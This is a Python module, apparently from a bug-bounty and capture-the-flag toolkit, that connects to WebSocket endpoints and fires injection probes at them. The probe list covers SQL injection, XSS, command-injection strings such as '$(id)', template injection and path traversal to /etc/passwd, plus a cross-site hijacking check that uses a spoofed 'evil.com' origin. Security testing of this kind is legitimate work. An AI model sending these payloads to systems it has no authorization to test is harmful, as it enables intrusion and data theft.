"""WebSocket testing module — WS connection and injection testing.

Handles:
- WebSocket connection establishment
- Message injection testing (SQLi, XSS, command injection via WS)
- Cross-site WebSocket hijacking detection
- WS authentication bypass testing

Usage:
    from bugbounty_ctf.websocket import WebSocketTester

    ws = WebSocketTester("ws://target/ws")
    ws.connect()
    ws.test_injection("test_message")
    ws.test_sql_injection()
    ws.test_xss()
"""

from __future__ import annotations

import contextlib
import json
import re
from dataclasses import dataclass, field
from typing import Any

try:
    import websocket

    HAS_WS = True
except ImportError:
    HAS_WS = False

FLAG_PATTERNS = [r"HTB\{[^}]+\}", r"flag\{[^}]+\}", r"CTF\{[^}]+\}", r"pwn\{[^}]+\}"]

WS_INJECTION_PAYLOADS = {
    "sqli": ["'", "' OR 1=1--", "' UNION SELECT NULL--"],
    "xss": ["<script>alert(1)</script>", "<svg onload=alert(1)>"],
    "cmdi": ["; id", "| id", "$(id)"],
    "ssti": ["{{7*7}}", "${7*7}"],
    "lfi": ["../../../etc/passwd", "../../../../../../etc/hosts"],
}


@dataclass
class WSResult:
    """Result from a WebSocket test."""

    test_type: str
    payload: str = ""
    sent: bool = False
    response: str = ""
    is_flag: bool = False
    interesting: bool = False
    details: dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        return {
            "test_type": self.test_type,
            "payload": self.payload,
            "sent": self.sent,
            "response": self.response[:300],
            "is_flag": self.is_flag,
            "interesting": self.interesting,
            "details": self.details,
        }


def _extract_flags(text: str) -> list[str]:
    flags: list[str] = []
    for pattern in FLAG_PATTERNS:
        flags.extend(re.findall(pattern, text, re.IGNORECASE))
    return list(set(flags))


class WebSocketTester:
    """WebSocket connection and injection testing.

    Requires websocket-client: pip install websocket-client
    """

    def __init__(self, url: str, *, headers: dict[str, str] | None = None) -> None:
        self.url = url
        self.headers = headers or {}
        self.ws: Any = None
        self.results: list[WSResult] = []
        self.connected = False

    def connect(self) -> bool:
        """Establish WebSocket connection."""
        if not HAS_WS:
            print("[-] websocket-client not installed: pip install websocket-client")
            return False

        try:
            self.ws = websocket.create_connection(
                self.url,
                header=[f"{k}: {v}" for k, v in self.headers.items()],
                timeout=10,
            )
            self.connected = True
            print(f"[+] WebSocket connected to {self.url}")
            return True
        except Exception as e:
            print(f"[-] WebSocket connection failed: {e}")
            return False

    def send_message(self, message: str) -> str | None:
        """Send a message and receive the response."""
        if (not self.connected or not self.ws) and not self.connect():
            return None

        try:
            self.ws.send(message)
            response = self.ws.recv()
            return str(response)
        except Exception as e:
            print(f"  [-] Send/recv error: {e}")
            return None

    def send_json(self, data: dict[str, Any]) -> str | None:
        """Send a JSON message and receive the response."""
        return self.send_message(json.dumps(data))

    def test_injection(self, message: str) -> WSResult:
        """Send a message and check the response for interesting patterns."""
        response = self.send_message(message)
        result = WSResult(test_type="generic", payload=message, sent=response is not None)

        if response:
            result.response = response
            flags = _extract_flags(response)
            if flags:
                result.is_flag = True
                result.details["flags"] = flags
                print(f"  [FLAG] {flags}")

            if "error" in response.lower() or "sql" in response.lower():
                result.interesting = True
            if "uid=" in response:
                result.interesting = True
                result.details["indicator"] = "command_output"
            if "49" in response and "{{7*7}}" in message:
                result.interesting = True
                result.details["indicator"] = "ssti_evaluated"

        self.results.append(result)
        return result

    def test_all_injections(self) -> list[WSResult]:
        """Run all injection payload categories."""
        for vuln_type, payloads in WS_INJECTION_PAYLOADS.items():
            print(f"\n[*] Testing {vuln_type} via WebSocket")
            for payload in payloads:
                result = self.test_injection(payload)
                if result.interesting:
                    print(f"  [!] {vuln_type}: {payload} → interesting")
                if result.is_flag:
                    print(f"  [FLAG] {payload} → {result.details.get('flags', [])}")

        return self.results

    def test_sql_injection(self) -> list[WSResult]:
        """Test SQL injection via WebSocket."""
        results: list[WSResult] = []
        for payload in WS_INJECTION_PAYLOADS["sqli"]:
            result = self.test_injection(payload)
            if result.interesting:
                results.append(result)
        return results

    def test_xss(self) -> list[WSResult]:
        """Test XSS via WebSocket."""
        results: list[WSResult] = []
        for payload in WS_INJECTION_PAYLOADS["xss"]:
            response = self.send_message(payload)
            if response and payload in response:
                result = WSResult(
                    test_type="xss",
                    payload=payload,
                    sent=True,
                    response=response,
                    interesting=True,
                    details={"indicator": "reflected"},
                )
                self.results.append(result)
                results.append(result)
                print(f"  [!] XSS reflected: {payload}")
        return results

    def test_cswh(self, target_origin: str | None = None) -> dict[str, Any]:
        """Test Cross-Site WebSocket Hijacking (CSWSH).

        Checks if the WebSocket endpoint accepts connections without
        proper Origin header validation.
        """
        if not HAS_WS:
            return {"error": "websocket-client not installed"}

        try:
            ws = websocket.create_connection(
                self.url, timeout=5, origin=target_origin or "http://evil.com"
            )
            ws.close()
            return {
                "vulnerable": True,
                "description": "WebSocket accepts connections from any origin (CSWSH)",
                "target": self.url,
            }
        except Exception as e:
            return {
                "vulnerable": False,
                "description": f"Connection rejected: {e}",
            }

    def close(self) -> None:
        """Close the WebSocket connection."""
        if self.ws:
            with contextlib.suppress(Exception):
                self.ws.close()
        self.connected = False

    def get_results(self) -> list[dict[str, Any]]:
        """Return all results as dicts."""
        return [r.to_dict() for r in self.results]
